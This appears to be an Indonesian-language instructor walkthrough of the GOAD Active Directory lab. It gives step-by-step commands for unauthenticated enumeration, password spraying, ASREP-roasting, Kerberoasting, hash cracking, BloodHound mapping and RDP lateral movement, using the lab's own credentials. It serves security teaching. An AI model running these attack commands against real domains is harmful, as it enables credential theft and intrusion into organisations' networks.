# Skenario Serangan GOAD — "Fall of the North"

**Cerita:** Attacker mulai dari posisi *unauthenticated* di jaringan lab. Target akhir: mencuri kredensial + memetakan domain `sevenkingdoms.local` / `north.sevenkingdoms.local`, lalu masuk ke mesin internal.

> Catatan IP: `kingslanding .10` (DC sevenkingdoms.local), `winterfell .11` (DC north.sevenkingdoms.local), `meereen .12` (essos.local), `castelblack .22` (server di north).

---

## Fase 0 — Setup Lab

Tambahkan mapping host agar resolusi nama domain bekerja (untuk Kerberos & BloodHound).

```
# /etc/hosts
192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
```

---

## Fase 1 — Network & Service Reconnaissance

Tujuan: temukan host hidup, role (DC/member), dan OS.

```bash
# 1) Temukan host SMB yang hidup + baca NetBIOS/domain
crackmapexec smb 192.168.56.1/24

# 2) Full port scan terhadap DC target (tersimpan ke file utk dokumentasi)
nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10
```

**Pembelajaran:** `crackmapexec` menampilkan kolom `[+]`/`[*]` host, nama domain (`sevenkingdoms.local`, `north...`), dan versi SMB. Scan penuh menunjukkan port 88 (Kerberos), 389/636 (LDAP), 445, 3389 (RDP), 5985 (WinRM) → menentukan vektor serangan berikutnya.

---

## Fase 2 — Enumeration Unauthenticated (Null Session & Guest)

Tujuan: ekstrak daftar user, group, dan share **tanpa kredensial** — cari misconfig SMB/LDAP.

```bash
# 2.1) Enum user via SAMR (tanpa kredensial)
crackmapexec smb 192.168.56.11 --users
crackmapexec smb 192.168.56.11 -u '' -p '' --users

# 2.2) Enum share dengan guest/anonymous (username dummy 'a')
crackmapexec smb 192.168.56.10-23 -u 'a' -p '' --shares

# 2.3) Password-spray kecil: coba username=password (no brute per-user)
crackmapexec smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce

# 2.4) Enumeration klasik via RPC/SMB
enum4linux 192.168.56.11

# 2.5) Null session via rpcclient, lalu enumerasi user & group
rpcclient -U "NORTH\\" 192.168.56.11 -N
#   >> di dalam prompt rpcclient:
enumdomusers
enumdomgroups
#   >> atau dari shell langsung:
net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
```

**Hasil yang diharapkan:** file `users.txt` / `got_users.txt` berisi username valid (mis. `brandon.stark`, `jon.snow`, `arya.stark`, dst.) → bahan untuk ASREP-roast dan enumerasi Kerberos berikut.

---

## Fase 3 — Kerberos User Enumeration (Cross-Domain)

Tujuan: validasi username terhadap domain `essos.local` (.12) tanpa lockout, via pre-auth Kerberos AS-REQ.

```bash
nmap -p 88 --script=krb5-enum-users \
  --script-args="krb5-enum-users.realm='essos.local',userdb=got_users.txt" \
  192.168.56.12
```

**Pembelajaran:** respon Kerberos `KDC_ERR_PREAUTH_REQUIRED` vs `KDC_ERR_C_PRINCIPAL_UNKNOWN` membedakan user valid vs tidak — teknik *user enumeration* yang tidak meninggalkan log login SMB.

---

## Fase 4 — ASREP-Roasting (Attacker tanpa kredensial → dapat hash)

Tujuan: temukan akun tanpa *pre-authentication* (ASREP), dapatkan hash TGT, crack offline.

```bash
# 4.1) Ambil hash AS-REP utk tiap user di daftar
impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile users-north.txt

# 4.2) Crack hash TGT (format Kerberos 5 etype 23)
hashcat -O -w 1 -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

**Hasil:** plaintext password (contoh alur lab: akun tanpa pre-auth memberi kredensial pertama yang valid → **initial foothold**).

---

## Fase 5 — Initial Access & Validasi Kredensial

Tujuan: konfirmasi kredensial hasil cracking dan mulai enum dengan akses login.

```bash
# 5.1) Enumerasi semua user di domain memakai kredensial brandon.stark
GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople

# 5.2) Validasi pasangan kredensial lain terhadap share di semua host SMB
crackmapexec smb 192.168.56.10-23 -u jon.snow -p iknownothing \
  -d north.sevenkingdoms.local --shares
```

**Pembelajaran:** satu set kredensial (mis. hasil ASREP/cracking) langsung memberi daftar user & akses baca share. `nxc`/`crackmapexec` menandai host tempat kredensial `[+]` valid.

---

## Fase 6 — Kerberoasting (Privilege Discovery via SPN)

Tujuan: temukan akun service (SPN) yang bisa di-*request* TGS oleh user biasa → hash untuk dicrack → kredensial service/privileged.

```bash
# 6.1) Request & simpan hash TGS semua SPN
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 \
  north.sevenkingdoms.local/brandon.stark:iseedeadpeople \
  -outputfile kerberoasting.hashes

# 6.2) Via nxc (cara modern, langsung dump ke KERBEROASTING/)
nxc ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' \
  -d north.sevenkingdoms.local --kerberoasting KERBEROASTING

# 6.3) Crack TGS hash
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```

**Pembelajaran:** beda ASREP (hash TGT, tanpa login) vs Kerberoast (hash TGS, butuh user valid). Akun service dengan password lemah → seringkali privilege escalation.

---

## Fase 7 — Active Directory Mapping (BloodHound)

Tujuan: petakan jalur serangan/privilege dari posisi user biasa ke DA.

```bash
# 7.1) Collect data domain NORTH (sumber brandon.stark)
bloodhound-python --zip -c All -d north.sevenkingdoms.local \
  -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local \
  -ns 192.168.56.11

# 7.2) Collect data domain ROOT sevenkingdoms.local (trust/cross-domain)
bloodhound-python --zip -c All -d sevenkingdoms.local \
  -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople \
  -dc kingslanding.sevenkingdoms.local -ns 192.168.56.10
```

**Pembelajaran:** perhatikan penggunaan *UPN suffix* (`user@north.sevenkingdoms.local`) saat menembus trust antar-domain. Import kedua `.zip` ke BloodHound → cari *Shortest Path to Domain Admins* (misal lewat kerberoastable account, GenericAll, AdminCount, dst.).

---

## Fase 8 — Lateral Movement / Persistence (Access ke Mesin)

Tujuan: gunakan kredensial (mis. `jon.snow`) untuk akses interaktif ke host internal & exfil/persistence.

```bash
xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert:ignore
```

**Pembelajaran:** host `.22` (`castelblack.north.sevenkingdoms.local`) jadi target *lateral movement* setelah akunnya bocor di fase cracking/spray. Dari sini attacker bisa dumping SAM/LSASS, pass-the-hash, atau lanjut ke domain lain.

---

## Ringkasan Kill-Chain

| Fase | Teknik | Input → Output |
|---|---|---|
| 0 | `/etc/hosts` | resolusi nama utk Kerberos/BH |
| 1 | SMB/Nmap scan | peta host + DC |
| 2 | Null/guest enum | `users.txt`, share list |
| 3 | Kerberos user enum | validasi username (essos) |
| 4 | **ASREP-Roast** | hash → password #1 (foothold) |
| 5 | Login valid + spray | konfirmasi kredensial & share |
| 6 | **Kerberoast** | hash TGS → password service |
| 7 | BloodHound | jalur ke Domain Admin |
| 8 | RDP / pivot | foothold di host internal |

---

## Catatan Pengajar

- Jalankan tiap fase berurutan; jelaskan perbedaan *unauthenticated* vs *authenticated* enumeration.
- Tekankan: ASREP-roast (Fase 4) tidak butuh kredensial, sedangkan Kerberoast (Fase 6) butuh user valid.
- Fase 3 & 7 menunjukkan penjelajahan **lintas domain** (essos.local & trust antar domain sevenkingdoms → north).
- Lockout policy bisa mengganggu spray; gunakan `--no-bruteforce` dan wordlist yang sudah divalidasi dari Fase 2.
- Import hasil BloodHound (Fase 7) untuk memandu langkah escalation selanjutnya setelah Fase 8.
